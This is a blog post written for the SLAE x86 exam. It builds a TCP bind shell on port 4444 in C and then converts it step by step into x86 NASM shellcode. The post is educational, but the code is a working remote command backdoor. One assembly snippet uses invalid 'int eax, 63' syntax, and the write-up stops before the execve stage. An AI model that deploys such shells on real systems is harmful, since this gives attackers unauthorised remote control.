---
title: "SLAE x86 Exam - Assignment #1"
date: 2021-11-28
toc: true
search: false
classes: wide
categories:
  - blog
tags:
  - slae
  - assembly
  - nasm
  - c
  - exam
---

## Disclaimer

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:

<https://www.pentesteracademy.com/course?id=3>

Student ID: PA-30398

## Foreword

The first assignment requires you to write a `Bind Shell TCP`, which is simply a listening socket that executes commands received from the client and sends back the `standard output` and `standard error`.

Follows the visual representation of this technique:

![TODO: INSERT IMAGE]()

## First Attempt

### C Source Code

The first step is to create a listening TCP socket:

```cpp
int server_socket_fd;
struct sockaddr_in server_address;

// create a TCP socket
server_socket_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));

// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);
```

Initially, a socket is created through the `socket` function, which returns a `File Descriptor` (on UNIX systems everyting is treated like a file, sockets too). The arguments `SOCK_STREAM` and `IPPROTO_TCP` allows the creation of a `TCP` socket.

After that, you have to to specify the address and port number on which to bind the socket. In this case, I used `INADDR_ANY` (i.e. bind the socket on all the addresses (`0.0.0.0`)), and the typical port used by Metasploit (`4444`).

These variables are passed to the `bind` function, which performs the binding operation. However, if you were to run `ss -tnl` (or `netstat -plnt`), you wouldn't find the current socket.

The reason is that we have to execute the `listen` function first. It accept 2 arguments:

1. the File Descriptor of the socket
2. *the maximum length to which the queue of pending connections for sockfd may grow* (ref: [man page](https://man7.org/linux/man-pages/man2/listen.2.html))

Before being able to receive data and execute commands, the socket has to accept a connection from incoming clients:

```cpp
int client_socket_fd, bytes_read, size_client_socket_struct;
struct sockaddr_in client_address;

// accept incoming connections
size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);

// redirect standard input/output/error to the socket
dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);
```

The function `accept` accepts a client connection, and places its socket (IP address and port) inside the variable `client_address`. After that, I used `dup2` in order to redirect `stdin`, `stdout`, and `stderr` of the current shell towards the client socket, so it acts as an interactive shell.

What's missing is only the code that executes the commands sent by the client:

```cpp
char client_command[1024] = {0};

char *const parmList[] = {"/bin/sh", "-c", client_command, NULL};
char *const envParms[] = {NULL};

// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}
```

The loops checks if the client sent any data. If so, it executes the commands and sends input/output/errors to the client socket. Finally, it uses the function `memset` in order to clear the buffer that stores the command and avoid previous commands from corrupting next ones.

The full code can be found inside the [repo created for this exam](https://github.com/rbctee/SlaeExam/blob/main/code/assignment_1/first_attempt/shell_bind_tcp.c).

### Assembly Code

#### Socket creation

The first function we need to convert into Assembly is `socket`. Unfortunately there isn't a specific syscall that creates a socket, however there's one named `socketcall`. According to its [man page](https://linux.die.net/man/2/socketcall):

> `int socketcall(int call, unsigned long *args);`
>
> **socketcall()** is a common kernel entry point for the socket system calls. *call* determines which socket function to invoke. *args* points to a block containing the actual arguments, which are passed through to the appropriate call.

Based on this description and the function definition it seems we need to find the right `call` value that references `socket()`. Although man pages don't list all the possible values for this argument (please contact me if you find them inside the man pages), we can take a look at the source code of the Linux kernel.

To be more specific, [this page](https://github.com/torvalds/linux/blob/master/net/socket.c#L2901) contains the implementation of the `socketcall` function, listing several possible value for the argument `call`:

```cpp
// ...

switch (call) {

  case SYS_SOCKET:
    err = __sys_socket(a0, a1, a[2]);
    break;

  case SYS_BIND:
    err = __sys_bind(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_CONNECT:
    err = __sys_connect(a0, (struct sockaddr __user *)a1, a[2]);
    break;

  case SYS_LISTEN:
    err = __sys_listen(a0, a1);
    break;

  case SYS_ACCEPT:
    err = __sys_accept4(a0, (struct sockaddr __user *)a1, (int __user *)a[2], 0);
    break;

  case SYS_GETSOCKNAME:
    err = __sys_getsockname(a0, (struct sockaddr __user *)a1, (int __user *)a[2]);
    break;

// ...
```

Nevertheless, it's still not what we want: it doesn't show the integer values of these values. Digging a bit deeper, I found them inside the file [include/uapi/linux/net.h](https://github.com/torvalds/linux/blob/master/include/uapi/linux/net.h#L27).

```cpp
#define SYS_SOCKET            1      /*     sys_socket(2)          */
#define SYS_BIND              2      /*     sys_bind(2)            */
#define SYS_CONNECT           3      /*     sys_connect(2)         */
#define SYS_LISTEN            4      /*     sys_listen(2)          */
#define SYS_ACCEPT            5      /*     sys_accept(2)          */
#define SYS_GETSOCKNAME       6      /*     sys_getsockname(2)     */
#define SYS_GETPEERNAME       7      /*     sys_getpeername(2)     */
#define SYS_SOCKETPAIR        8      /*     sys_socketpair(2)      */
#define SYS_SEND              9      /*     sys_send(2)            */
#define SYS_RECV              10     /*     sys_recv(2)            */
#define SYS_SENDTO            11     /*     sys_sendto(2)          */
#define SYS_RECVFROM          12     /*     sys_recvfrom(2)        */
#define SYS_SHUTDOWN          13     /*     sys_shutdown(2)        */
#define SYS_SETSOCKOPT        14     /*     sys_setsockopt(2)      */
#define SYS_GETSOCKOPT        15     /*     sys_getsockopt(2)      */
#define SYS_SENDMSG           16     /*     sys_sendmsg(2)         */
#define SYS_RECVMSG           17     /*     sys_recvmsg(2)         */
#define SYS_ACCEPT4           18     /*     sys_accept4(2)         */
#define SYS_RECVMMSG          19     /*     sys_recvmmsg(2)        */
#define SYS_SENDMMSG          20     /*     sys_sendmmsg(2)        */
```

Now we should be able to use the `socket` function.

```nasm
; Author: Robert Catalin Raducioiu (rbct)

global _start

section .text

_start:

    ; SYSCALLS for Linux x86:
    ; /usr/include/i386-linux-gnu/asm/unistd_32.h
    ; or https://web.archive.org/web/20160214193152/http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html

    ; sys_socketcall
    mov eax, 102

    ; SYS_SOCKET
    mov ebx, 1

    ; IPPROTO_TCP
    push 0x00000006

    ; SOCK_STREAM
    push 0x00000001

    ; AF_INET
    push 0x00000002

    mov ecx, esp

    ; call syscall
    int 0x80
```

Debugging the program with `gdb` and stopping after the syscall I noticed the following output:

```bash
lsof -p PID

# COMMAND    PID USER   FD   TYPE     DEVICE SIZE/OFF  NODE NAME
# tcp_bind_ 4339 rbct  cwd    DIR        8,1     4096  6052 /home/rbct/exam/assignment_1
# tcp_bind_ 4339 rbct  rtd    DIR        8,1     4096     2 /
# tcp_bind_ 4339 rbct  txt    REG        8,1      522  6053 /home/rbct/exam/assignment_1/tcp_bind_shell
# tcp_bind_ 4339 rbct    0u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    1u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    2u   CHR      136,0      0t0     3 /dev/pts/0
# tcp_bind_ 4339 rbct    3u  unix 0x00000000      0t0 89245 socket
# tcp_bind_ 4339 rbct    4u  unix 0x00000000      0t0 89246 socket
# tcp_bind_ 4339 rbct    5r  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    6w  FIFO        0,8      0t0 89247 pipe
# tcp_bind_ 4339 rbct    7u  sock        0,7      0t0 89254 can't identify protocol
```

It successfully created a socket (identified by the file descriptor `7`, `u` specifies `read` and `write` permissions according to the man page of `lsof`).

#### Socket binding

Next is the turn of the `bind` function.

```cpp
server_address.sin_family = AF_INET;
server_address.sin_addr.s_addr = INADDR_ANY;
server_address.sin_port = htons(4444);

// bind the socket to 0.0.0.0:4444
bind(server_socket_fd, (struct sockaddr *)&server_address, sizeof(server_address));
```

First, I need to understand how to create a `sockaddr_in` struct (which is the variable `server_address`). Based on [the manual of Linux](https://man7.org/linux/man-pages/man7/ip.7.html), it looks like this:

```cpp
struct sockaddr_in {
  sa_family_t    sin_family; /* address family: AF_INET */
  in_port_t      sin_port;   /* port in network byte order */
  struct in_addr sin_addr;   /* internet address */
};

/* Internet address */
struct in_addr {
  uint32_t       s_addr;     /* address in network byte order */
}
```

Now we need the type definition of `sa_family_t`, which is defined inside [/usr/include/socket.h](https://elixir.bootlin.com/linux/latest/source/include/linux/socket.h#L26):

```cpp
typedef __kernel_sa_family_t    sa_family_t;
```

Based on the file [include/uapi/linux/socket.h](https://elixir.bootlin.com/linux/latest/source/include/uapi/linux/socket.h#L10):

```cpp
typedef unsigned short __kernel_sa_family_t;
```

So it is an unsigned short. On x86 systems it occupies `2 bytes` of data. Now, there's only `in_port_t` left. It is defined inside the file [netinetin.h](https://man7.org/linux/man-pages/man0/netinet_in.h.0p.html):

> The `<netinet/in.h>` header shall define the following types:
>
> - `in_port_t` Equivalent to the type uint16_t as described in `<inttypes.h>`

Based on this information, now the struct should look like this:

```cpp
struct sockaddr_in {
  unsigned short      sin_family;
  unsigned short      sin_port;
  struct in_addr      sin_addr;
};

struct in_addr sin_addr {
  unsigned int        s_addr;
}
```

P.S. Don't forget the definition of `sys_socketcall`:

```cpp
int syscall(SYS_socketcall, int call, unsigned long *args);
```

In particular, in the case of the `bind` function, you can't use `ecx`, `edx`, and so on, because they would be passed to `sys_socketcall`. Just like before, the arguments are passed as a pointer, using the `ecx` register.

Follows the assembly code:

```nasm
    ; INADDR_ANY (0x00000000)
    push 0
    
    ; 0x0002 -> AF_INET
    ; 0x115c -> htons(4444)
    push 0x5c110002

    ; save the pointer to the struct for later
    mov ecx, esp
    
    ; 3rd argument of bind(): size of the struct
    push 16

    ; 2nd argument of bind(): pointer to the struct
    push ecx

    ; 1st argument of bind(): file descriptor of the server socket
    mov esi, eax
    push eax
    
    ; syscall socketcall
    mov eax, 102

    ; 1st argument of socketcall(): call SYS_BIND
    mov ebx, 2

    ; 2nd argument of socketcall(): pointer to the parameters of bind()
    mov ecx, esp

    int 0x80
```

You may be wondering why I used `push 16` for the 3rd argument of `bind()`, instead of the current size of struct, which is 8 bytes. Initially, I tried using `push 8`, however `bind()` would return the value `0xffffffea` (`EINVAL`), which means an argument is invalid.

Later, I discovered the right size should be `16` (doing a simple `printf` of `sizeof(server_address)`). However, the real reason can be found in the definition of the struct:

```cpp
#define __SOCK_SIZE__   16              /* sizeof(struct sockaddr)      */
struct sockaddr_in {
  __kernel_sa_family_t  sin_family;     /* Address family               */
  __be16                sin_port;       /* Port number                  */
  struct in_addr        sin_addr;       /* Internet address             */

  /* Pad to size of `struct sockaddr'. */
  unsigned char         __pad[__SOCK_SIZE__ - sizeof(short int) -
                        sizeof(unsigned short int) - sizeof(struct in_addr)];
};
```

It uses padding characters to reach a size of 16 bytes.

#### Listening for connections

Now we need to convert the following line into assembly:

```cpp
// set it as a passive socket that listens for connections
listen(server_socket_fd, 1);
```

Based on previous findings, the second argument of `socketcall` should be `SYS_LISTEN` (`4`).

Follows the assembly code:

```nasm
    ; 2nd argument of listen(): set backlog (connection queue size) to 1
    push 1

    ; 1st argument of listen(): file descriptor of the server socket
    push esi
    
    ; syscall socketcall
    mov eax, 102

    ; 1st argument of socketcall(): SYS_LISTEN call
    mov ebx, 4

    ; 2nd argument of socketcall(): pointer to listen() arguments
    mov ecx, esp

    ; execute listen()
    int 0x80
```

#### Accepting connections

It's time to accept connections from out client. We need to convert the following C++ code into assembly:

```cpp
size_client_socket_struct = sizeof(struct sockaddr_in);
client_socket_fd = accept(server_socket_fd, (struct sockaddr *)&client_address, (socklen_t *)&size_client_socket_struct);
```

Follows the assembly code:

```nasm
    ; 3rd argument of accept(): size of client_address struct
    push 16

    ; 2nd argument of accept: client_address struct, in this case empty
    push 0
    push 0

    ; 1st argument of accept: file descriptor of the server socket
    push esi

    ; syscall socketcall
    mov eax, 102

    ; 1st argument of socketcall(): SYS_ACCEPT call
    mov ebx, 5

    ; 2nd argument of socketcall(): pointer to accept() arguments
    mov ecx, esp

    ; execute accept()
    int 0x80
```

#### I/O Redirection

As mentioned previously, the redirection of Input/Output/Error is performed by means of the function `dup2`. The call to `accept()` returns the File Descriptor associated with the Client Socket.

```cpp
dup2(client_socket_fd, 0);
dup2(client_socket_fd, 1);
dup2(client_socket_fd, 2);
```

According to the file `/usr/include/i386-linux-gnu/asm/unistd_32.h`, `dup2` is the syscall `#63`. Given this information, we're now ready to convert the code above into assembly:

```nasm
    ; save the Client File Descriptor for later use
    mov edi, eax

    ; dup2(client_socket_fd, 0)
    int eax, 63
    int ebx, edi
    int ecx, 0
    int 0x80

    ; dup2(client_socket_fd, 1)
    int eax, 63
    int ebx, edi
    int ecx, 1
    int 0x80

    ; dup2(client_socket_fd, 2)
    int eax, 63
    int ebx, edi
    int ecx, 02
    int 0x80
```

This is good, but I wanted a better approach, one that uses fewer bytes:

```nasm
    ; loop counter (repeats dup2() three times)
    mov ecx, 3

    ; save Client File Descriptor for later use
    mov edi, eax

RepeatDuplicate:
    ; save ecx since it's modified later
    push ecx

    ; dup2() syscall
    mov eax, 63

    ; Client file descriptor
    mov ebx, edi

    ; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor
    mov ecx, DWORD [esp]
    dec ecx

    ; call dup2()
    int 0x80

    ; restore ecx and check if loop is over
    pop ecx
    loop RepeatDuplicate
```

#### Command Execution

Finally, to have a fully-functional bind shell, we need to convert the following block of code into assembly:

```cpp
// receive data from client (max 1024 bytes)
while ((bytes_read = recv(client_socket_fd, &client_command, 1024, 0)) > 0) {
    // execute client command
    system(client_command);
    memset(client_command, 0, sizeof(client_command));
}
```

Follows the syscall numbers:

- `recv`: invoked via `socketcall` (`SYS_RECV`: `10`)
- `system`: it's a wrapper, so we're going to use `execve`
- `memset`: there's no syscall

It seems we're missing some functions. Therefore, I decided to reimplement it manually:

```nasm

```
